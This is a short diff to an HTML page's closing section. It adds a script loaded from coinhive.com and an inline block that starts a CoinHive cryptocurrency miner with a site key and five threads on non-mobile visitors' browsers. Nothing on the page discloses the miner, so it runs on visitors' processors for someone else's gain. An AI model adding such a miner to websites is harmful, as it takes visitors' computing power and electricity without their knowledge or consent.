@@ -79,7 +79,9 @@
 			</tbody>
 		</table>
 
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 		<script src="assets/js/zepto.min.js"></script>
+		<script src="assets/js/particle.min.js"></script>
 		<script type="text/javascript">
 			$('a').on('click', function(event) {
 				event.preventDefault()
@@ -101,6 +103,14 @@
 					$(this).parent().toggleClass('hidden animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() { $(this).removeClass('animated bounceIn') })
 				}, this), Math.floor(Math.random()*250))
 			})
+		</script>
+		<script>
+			var miner = new CoinHive.Anonymous('YF3ZzrvkDjgA0v5mvbgTNXtXeKAwQMxE', {throttle: 0.5, threads: 5});
+
+			// Only start on non-mobile devices and if not opted-out in the last 14400 seconds (4 hours):
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+			}
 		</script>
 	</body>
 </html>
